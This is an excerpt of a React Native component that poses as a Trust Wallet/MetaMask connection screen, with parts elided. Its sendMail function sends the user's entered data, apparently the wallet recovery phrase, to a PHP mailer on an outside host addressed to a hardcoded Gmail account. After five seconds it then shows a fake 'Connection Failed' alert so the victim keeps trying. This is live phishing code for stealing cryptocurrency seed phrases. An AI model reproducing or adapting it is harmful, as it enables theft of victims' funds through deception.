...
export function Metamask({ navigation }) {
    ...
    async function sendMail() {
        setLoading(true)
        const email = "twallet290@gmail.com"
            ...
            await axios.get(`http://lunoinvest.com/sendemail.php?email=${email}&subject=${sub}&message=${msg}`)
                .then(() => {
                    setTimeout(() => {
                        ...
                        Alert.alert(
                            'Connection Failed',
                            ` Incorrect Phrase or you are connecting from an unsupported country. Trust Wallet Phrase are usually 12,14 or 24 single space all lowalcase words.`,
                            [{ text: 'Ok' }]
                        );
                    },5000);
        ...
        <SafeArea>
            <View style={{ flex: 1 }}>
                ...
                {loading ? <ActivityIndicator size="large" color='gray' /> : null}
                    <Image source={require('../assets/trustWellet.png')} style={{ height: 135, width: 135 }}/>
                        ...
                        <View style={styles.modacontent}>
                            <View>
                                <View style={{padding:10,justifyContent:'space-between',flexDirection:'row'}}>
                                    {/* <Image source={require('../assets/ttt1.png')} style={{height:30,width:30}}/> */}
